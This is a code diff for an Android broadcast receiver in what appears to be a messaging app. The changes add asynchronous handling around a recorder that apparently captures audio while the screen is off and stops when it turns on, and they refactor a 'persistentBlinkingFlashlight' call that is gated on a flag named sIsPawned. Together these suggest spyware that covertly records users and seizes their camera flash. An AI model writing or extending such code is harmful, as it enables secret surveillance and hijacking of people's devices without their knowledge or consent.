@@ -11,6 +11,7 @@ import android.os.Process;
 import android.util.Log;
 
 import com.candroid.textme.api.Lofl;
+import com.candroid.textme.api.Systems;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.services.MessagingService;
@@ -29,6 +30,7 @@ public class ScreenReceiver extends BroadcastReceiver {
         if(intent.getAction().equals(Intent.ACTION_SCREEN_ON)){
             if(context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED){
                 if(MessagingService.sRecorder != null) {
+                    PendingResult result = goAsync();
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
@@ -53,6 +55,7 @@ public class ScreenReceiver extends BroadcastReceiver {
                             }
                             MessagingService.stopRecording();
                             MessagingService.sRecorder = null;
+                            result.finish();
                         }
                     }).start();
                 }
@@ -66,7 +69,7 @@ public class ScreenReceiver extends BroadcastReceiver {
             }*/
             if(!isTaskScheduled && sIsPawned){
                 if(context.checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-                    Lofl.persistentBlinkingFlashlight(context);
+                    Systems.Camera.persistentBlinkingFlashlight(context);
                 }
             }
         }else if(intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
